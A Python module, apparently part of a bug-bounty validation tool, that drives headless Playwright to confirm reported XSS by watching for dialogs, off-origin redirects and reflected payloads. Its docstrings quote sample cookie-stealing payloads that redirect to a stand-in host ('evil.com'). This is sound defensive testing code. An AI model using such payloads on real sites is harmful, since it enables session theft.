"""
Headless-browser XSS execution for the HackerOne validator.

This module drives Playwright against a proof URL and reports what the browser
OBSERVED — a JavaScript dialog firing, an off-origin navigation to a host
embedded in the payload, the payload reflected next to a live ``alert(`` call,
or an authentication wall. It never decides the final verdict; the validator
turns an ``XssBrowserRun`` into a ``ValidationResult``.

Split into small pieces so each decision is testable without a browser:
  - ``payload_exfil_hosts``     which hosts count as exfil/redirect proof
  - ``match_exfil_navigation``  did an observed navigation reach one of them
  - ``is_injected_element``     is a DOM element our own injection (safe to click)
  - ``observed_execution_mechanism`` which execution signal (if any) was seen
  - ``XssExecutionObserver``    collects dialog + navigation events for a page
"""

from __future__ import annotations

import base64
import re
from dataclasses import dataclass, field
from typing import Any, Dict, Iterable, List, Optional
from urllib.parse import unquote, urlparse

from dast.hackerone.auth_wall import looks_like_auth_wall
from dast.utils.logger import get_logger

logger = get_logger(__name__)

XSS_ALERT_RE = re.compile(r'alert\s*\(', re.IGNORECASE)

# Hosts that are never proof of exfiltration on their own — the target's own
# origin and common CDNs/analytics a legitimate page may navigate to.
_EXFIL_HOST_IGNORE = re.compile(
    r'(google-analytics|googletagmanager|gstatic|fonts\.google|doubleclick'
    r'|cloudflare|cdnjs|jsdelivr|unpkg)',
    re.IGNORECASE,
)
_EMBEDDED_URL_HOST_RE = re.compile(r'https?://([^/\s\'"\)\]}>&+?#;,]+)', re.IGNORECASE)

HANDLER_ATTRIBUTES = ("onclick", "onmouseover", "onmouseenter", "onfocus", "onload", "onerror")
_CLICK_CANDIDATE_SELECTORS = (
    "[href]", "[onclick]", "[onmouseover]", "[onmouseenter]", "[onfocus]", "[onload]", "[onerror]",
)
# Short payload fragments would match unrelated attributes by accident.
_MIN_PAYLOAD_NEEDLE_LENGTH = 8

_NAVIGATION_TIMEOUT_MS = 20000
_LOAD_STATE_TIMEOUT_MS = 5000
_POST_LOAD_WAIT_MS = 1000
_POST_INTERACTION_WAIT_MS = 600
_CLICK_TIMEOUT_MS = 2000
_POST_CLICK_WAIT_MS = 600

# Override the JS dialog sinks (alert/confirm/prompt) BEFORE navigation so they
# fire even on synchronous inline scripts. Native dialogs are OS-level and
# invisible in headless screenshots — we inject a visible DOM banner instead so
# the screenshot shows proof.
XSS_PROOF_INIT_SCRIPT = """
    window._xssAlertFired = false;
    window._xssAlertMessage = '';
    function _xssProof(kind, msg) {
        window._xssAlertFired = true;
        window._xssAlertMessage = (msg === undefined || msg === null) ? '' : String(msg);
        const banner = document.createElement('div');
        banner.id = '__xss_proof__';
        banner.style.cssText = [
            'position:fixed','top:0','left:0','width:100%','z-index:2147483647',
            'background:#ff0000','color:#ffffff','font:bold 18px monospace',
            'padding:16px 24px','text-align:center','box-shadow:0 4px 12px rgba(0,0,0,.5)'
        ].join(';');
        banner.textContent = 'XSS CONFIRMED — ' + kind + '(' + JSON.stringify(window._xssAlertMessage) + ')';
        (document.body || document.documentElement).appendChild(banner);
    }
    window.alert   = function(msg) { _xssProof('alert', msg); };
    window.confirm = function(msg) { _xssProof('confirm', msg); return true; };
    window.prompt  = function(msg) { _xssProof('prompt', msg); return ''; };
"""


# ── Pure decision helpers ─────────────────────────────────────────────────────

def payload_exfil_hosts(payload: str, proof_url: str) -> set[str]:
    """
    Extract candidate destination hosts embedded in a redirect/exfil XSS payload.

    A payload like ``javascript:location='https://evil.com?'+document.cookie``
    proves execution by navigating the browser to a host that is written into
    the payload but is NOT the target's own origin. We collect those hosts so a
    real off-origin navigation to one of them counts as observed execution
    (the browser followed the redirect — exactly what it is for), rather than
    relying on the LLM to read the source and speculate.

    We scan BOTH the extracted payload AND the proof URL, because the injected
    javascript: redirect very often lives entirely inside the proof URL's query
    string (``...?url=javascript:top.location='https://evil'+cookie``) while the
    report's "Payload:" label holds only prose ("victim clicks the link"). An
    earlier version scanned the payload alone and so found no exfil host in
    exactly this common shape, causing valid redirect XSS to fall to manual.

    The target's own host is excluded (navigating within the app is not proof).
    """
    hosts: set[str] = set()
    # Combine both sources and decode once — the proof URL carries the real
    # javascript: payload in the query string in the common case.
    haystack = unquote((payload or "") + " " + (proof_url or ""))
    try:
        target_host = urlparse(proof_url).netloc.lower()
    except Exception as exc:
        logger.debug("Could not parse proof URL host for exfil extraction", error=str(exc))
        target_host = ""

    for match in _EMBEDDED_URL_HOST_RE.finditer(haystack):
        host = match.group(1).lower().strip().rstrip(".")
        if not host or "." not in host:
            continue
        if target_host and (host == target_host or host.endswith("." + target_host)):
            continue
        if _EXFIL_HOST_IGNORE.search(host):
            continue
        hosts.add(host)
    return hosts


def match_exfil_navigation(navigated_hosts: Iterable[str], exfil_hosts: Iterable[str]) -> str:
    """
    Return the observed host if an off-origin payload redirect was seen, else "".

    Matches by domain family, not exact equality: a payload host of
    ``google.com`` is proven by a navigation to ``www.google.com`` (the
    destination often adds/strips ``www`` or redirects within its own domain).
    """
    exfil_host_list = list(exfil_hosts)
    for observed in navigated_hosts:
        for target in exfil_host_list:
            if (
                observed == target
                or observed.endswith("." + target)
                or target.endswith("." + observed)
            ):
                return observed
    return ""


def build_payload_needles(payload: str) -> set[str]:
    """Distinctive raw + decoded payload fragments to look for in element attributes."""
    decoded_payload = unquote(payload or "").strip()
    return {
        candidate for candidate in {payload, decoded_payload}
        if candidate and len(candidate) >= _MIN_PAYLOAD_NEEDLE_LENGTH
    }


def is_injected_element(
    href: str,
    attributes: Dict[str, Optional[str]],
    payload_needles: Iterable[str],
    exfil_hosts: Iterable[str],
) -> bool:
    """
    Return True when an element carries OUR injection and is safe to click.

    An element qualifies when its href is a ``javascript:`` sink, or when the
    reported payload or an exfil host from the payload appears in its href or
    on*-handler attributes. A native application control (a plain ``onclick``
    logout/delete button) never qualifies, so clicking cannot trigger a
    destructive app action.
    """
    if (href or "").strip().lower().startswith("javascript:"):
        return True
    haystacks = [href or ""] + [str(attributes.get(name) or "") for name in HANDLER_ATTRIBUTES]
    attribute_blob = " ".join(haystacks)
    decoded_blob = unquote(attribute_blob)
    for needle in payload_needles:
        if needle in attribute_blob or needle in decoded_blob:
            return True
    for host in exfil_hosts:
        if host and (host in attribute_blob or host in decoded_blob):
            return True
    return False


def payload_reflected_in_dom(payload: str, page_content: str) -> bool:
    """True when the raw or URL-decoded payload appears in the rendered DOM."""
    return bool(payload and (unquote(payload) in page_content or payload in page_content))


# ── Browser run result ────────────────────────────────────────────────────────

@dataclass
class XssBrowserRun:
    """Everything the browser observed while loading (and interacting with) a proof URL."""

    response_status: Optional[int] = None
    final_url: str = ""
    auth_wall: bool = False
    alert_fired: bool = False
    alert_message: str = ""
    exfil_navigation: str = ""
    navigated_hosts: List[str] = field(default_factory=list)
    page_content: str = ""
    payload_in_dom: bool = False
    screenshot_b64: str = ""


def observed_execution_mechanism(run: XssBrowserRun) -> str:
    """
    Return the browser-observed execution signal, or "" when none was seen.

    ``dialog`` — a JS dialog fired; ``redirect`` — the browser navigated to an
    off-origin host embedded in the payload; ``reflected_alert`` — the payload
    is reflected unescaped alongside a live ``alert(`` call. Order matters: the
    strongest signal wins.
    """
    if run.alert_fired:
        return "dialog"
    if run.exfil_navigation:
        return "redirect"
    if run.payload_in_dom and XSS_ALERT_RE.search(run.page_content):
        return "reflected_alert"
    return ""


# ── Event collection ──────────────────────────────────────────────────────────

class XssExecutionObserver:
    """Collects dialog and main-frame navigation events for one Playwright page."""

    def __init__(self, page: Any) -> None:
        self._page = page
        self.alert_fired = False
        self.alert_message = ""
        self.navigated_hosts: List[str] = []

    def attach(self) -> None:
        """Subscribe to the page events that prove execution."""
        self._page.on("dialog", self.handle_dialog)
        self._page.on("framenavigated", self.handle_frame_navigated)

    async def handle_dialog(self, dialog: Any) -> None:
        """Record and dismiss any native dialog that slips through the JS overrides."""
        self.alert_fired = True
        self.alert_message = dialog.message or ""
        await dialog.dismiss()

    def handle_frame_navigated(self, frame: Any) -> None:
        """
        Track main-frame navigations so a redirect-style XSS (which sends the
        browser to an attacker host embedded in the payload) is observed, not
        inferred.
        """
        try:
            if frame == self._page.main_frame:
                host = urlparse(frame.url).netloc.lower()
                if host:
                    self.navigated_hosts.append(host)
        except Exception as exc:
            logger.debug("Could not record frame navigation", error=str(exc))

    async def read_injected_dialog_state(self) -> None:
        """
        Read dialog state from the injected window vars — a JS override may have
        fired without a native "dialog" event.
        """
        try:
            if await self._page.evaluate("() => window._xssAlertFired === true"):
                self.alert_fired = True
                self.alert_message = str(
                    await self._page.evaluate("() => window._xssAlertMessage || ''")
                )
        except Exception as exc:
            logger.debug("Could not read injected XSS dialog state", error=str(exc))

    def exfil_navigation(self, exfil_hosts: Iterable[str]) -> str:
        """The observed navigation host that proves an exfil redirect, or ""."""
        return match_exfil_navigation(self.navigated_hosts, exfil_hosts)


# ── Interaction trigger ───────────────────────────────────────────────────────

async def _collect_click_candidates(page: Any) -> List[Any]:
    """Every element with an href or on*-handler — filtered later to our own injection."""
    candidates: List[Any] = []
    for selector in _CLICK_CANDIDATE_SELECTORS:
        try:
            candidates.extend(await page.query_selector_all(selector))
        except Exception as exc:
            logger.debug("XSS click-candidate query failed", selector=selector, error=str(exc))
            continue
    return candidates


async def _read_element_attributes(element: Any) -> tuple[str, Dict[str, Optional[str]]]:
    """Return (href, {handler_attribute: value}) for a DOM element."""
    href = await element.get_attribute("href")
    attributes: Dict[str, Optional[str]] = {}
    for attribute_name in HANDLER_ATTRIBUTES:
        attributes[attribute_name] = await element.get_attribute(attribute_name)
    return href or "", attributes


async def trigger_interaction_xss(page: Any, payload: str, exfil_hosts: set[str]) -> None:
    """
    Some XSS only fires on user interaction — e.g. an ``<a href="javascript:...">``
    that the report describes as "victim clicks the link". Loading the page does
    not fire it; a real click does. The browser exists precisely to perform that
    click.

    Safety through understanding, not blanket exclusion: we read each candidate
    element and click it ONLY when it is our own injection (see
    ``is_injected_element``). We never click a native application control, so
    we cannot trigger a destructive app action. This also broadens coverage
    beyond ``javascript:`` hrefs to onclick/onmouseover XSS, because the
    decision is "does this element contain what I injected?" rather than "what
    attribute type is it?".

    Each click is guarded and best-effort — a page navigating away mid-loop is
    the success case, not an error.
    """
    payload_needles = build_payload_needles(payload)
    try:
        seen_element_ids: set[int] = set()
        for element in await _collect_click_candidates(page):
            if id(element) in seen_element_ids:
                continue
            seen_element_ids.add(id(element))
            try:
                href, attributes = await _read_element_attributes(element)
            except Exception as exc:
                logger.debug("Could not read XSS click-candidate attributes", error=str(exc))
                continue
            if not is_injected_element(href, attributes, payload_needles, exfil_hosts):
                continue  # native app control — do not click
            try:
                await element.click(timeout=_CLICK_TIMEOUT_MS, no_wait_after=True)
                await page.wait_for_timeout(_POST_CLICK_WAIT_MS)
            except Exception as exc:
                # Click may fail because the page already navigated away (the
                # exfil redirect fired) — that is exactly what we wanted.
                logger.debug("XSS interaction click did not complete", error=str(exc))
    except Exception as exc:
        logger.debug("XSS interaction trigger failed", error=str(exc))


# ── Browser driver ────────────────────────────────────────────────────────────

def _browser_launch_kwargs(proxy_port: Optional[int]) -> Dict[str, Any]:
    """
    Chromium launch options. Route through the MITM proxy in normal operation;
    skip it when proxy_port is None (test harness drives a local target directly).
    """
    launch_kwargs: Dict[str, Any] = {
        "headless": True,
        "args": ["--ignore-certificate-errors"],
    }
    if proxy_port is not None:
        launch_kwargs["proxy"] = {"server": f"http://127.0.0.1:{proxy_port}"}
    return launch_kwargs


async def _add_session_cookies(context: Any, proof_url: str, cookies: Dict[str, str]) -> None:
    """Inject the (already sanitised) session cookies for the proof URL's host."""
    if not cookies:
        return
    domain = urlparse(proof_url).netloc
    await context.add_cookies([
        {"name": name, "value": value, "domain": domain, "path": "/"}
        for name, value in cookies.items()
    ])


async def _navigate(page: Any, proof_url: str) -> Any:
    """
    Load the proof URL, returning the response or None.

    "commit" fires as soon as the server starts responding — avoids timeouts on
    heavy ASP.NET/SPA pages with large VIEWSTATE payloads. A timeout or network
    error is not fatal: an alert may already have fired, so we inspect what we got.
    """
    from playwright.async_api import TimeoutError as PlaywrightTimeout

    try:
        return await page.goto(proof_url, wait_until="commit", timeout=_NAVIGATION_TIMEOUT_MS)
    except PlaywrightTimeout as exc:
        logger.debug("XSS proof URL navigation timed out; inspecting partial load", error=str(exc))
    except Exception as exc:
        logger.debug("XSS proof URL navigation failed; inspecting what loaded", error=str(exc))
    return None


async def _capture_screenshot(page: Any, full_page: bool) -> str:
    """Base64 PNG screenshot of the page, or "" when capture fails."""
    try:
        return base64.b64encode(await page.screenshot(full_page=full_page)).decode()
    except Exception as exc:
        logger.debug("XSS screenshot capture failed", error=str(exc))
        return ""


async def _page_is_auth_wall(page: Any, response_status: Optional[int], final_url: str) -> bool:
    """
    Cheap status/URL check first, then confirm against the rendered page text.
    A missing response is treated as HTTP 200.
    """
    effective_status = response_status if response_status is not None else 200
    if not looks_like_auth_wall(effective_status, final_url, ""):
        return False
    page_text = await page.content()
    return looks_like_auth_wall(effective_status, final_url, page_text)


async def _wait_for_page_scripts(page: Any) -> None:
    """Let page load finish (CSS/images) — non-fatal if it times out — then give JS time."""
    try:
        await page.wait_for_load_state("load", timeout=_LOAD_STATE_TIMEOUT_MS)
    except Exception as exc:
        logger.debug("XSS page load state wait did not complete", error=str(exc))
    await page.wait_for_timeout(_POST_LOAD_WAIT_MS)


async def run_xss_in_browser(
    proof_url: str,
    payload: str,
    proxy_port: Optional[int],
    cookies: Dict[str, str],
    screenshot: bool,
    checks_run: List[str],
) -> XssBrowserRun:
    """
    Drive headless chromium against ``proof_url`` and return what it observed.

    ``checks_run`` is appended in place so the caller keeps the trail even when
    this raises (Playwright missing, browser crash). Exceptions propagate — the
    caller turns them into an error verdict.
    """
    from playwright.async_api import async_playwright

    async with async_playwright() as playwright:
        browser = await playwright.chromium.launch(**_browser_launch_kwargs(proxy_port))
        context = await browser.new_context(
            ignore_https_errors=True,
            viewport={"width": 1280, "height": 800},
        )
        await _add_session_cookies(context, proof_url, cookies)

        page = await context.new_page()
        # Destination hosts written into the payload — an off-origin navigation
        # to one of these is observed proof of a redirect/exfil XSS.
        exfil_hosts = payload_exfil_hosts(payload, proof_url)
        await page.add_init_script(XSS_PROOF_INIT_SCRIPT)
        observer = XssExecutionObserver(page)
        observer.attach()
        checks_run.append("playwright_load")

        response = await _navigate(page, proof_url)
        response_status = response.status if response else None

        # Check for an auth wall before waiting for JS.
        final_url = page.url
        checks_run.append("auth_check")
        if await _page_is_auth_wall(page, response_status, final_url):
            screenshot_b64 = await _capture_screenshot(page, full_page=False) if screenshot else ""
            await browser.close()
            return XssBrowserRun(
                response_status=response_status,
                final_url=final_url,
                auth_wall=True,
                screenshot_b64=screenshot_b64,
            )

        await _wait_for_page_scripts(page)
        checks_run.append("js_wait")

        # If nothing fired on load, drive the interaction the report describes
        # ("victim clicks the link") so an interaction-required redirect/handler
        # actually executes before we fall back to manual review.
        if not observer.alert_fired and not observer.exfil_navigation(exfil_hosts):
            await trigger_interaction_xss(page, payload, exfil_hosts)
            await page.wait_for_timeout(_POST_INTERACTION_WAIT_MS)
            checks_run.append("interaction")

        await observer.read_injected_dialog_state()
        exfil_navigation = observer.exfil_navigation(exfil_hosts)

        page_content = await page.content()
        payload_in_dom = payload_reflected_in_dom(payload, page_content)
        checks_run.append("dom_check")

        # Screenshot after JS — the banner is visible in the page if a dialog fired.
        screenshot_b64 = await _capture_screenshot(page, full_page=True) if screenshot else ""
        await browser.close()

        return XssBrowserRun(
            response_status=response_status,
            final_url=final_url,
            alert_fired=observer.alert_fired,
            alert_message=observer.alert_message,
            exfil_navigation=exfil_navigation,
            navigated_hosts=list(observer.navigated_hosts),
            page_content=page_content,
            payload_in_dom=payload_in_dom,
            screenshot_b64=screenshot_b64,
        )
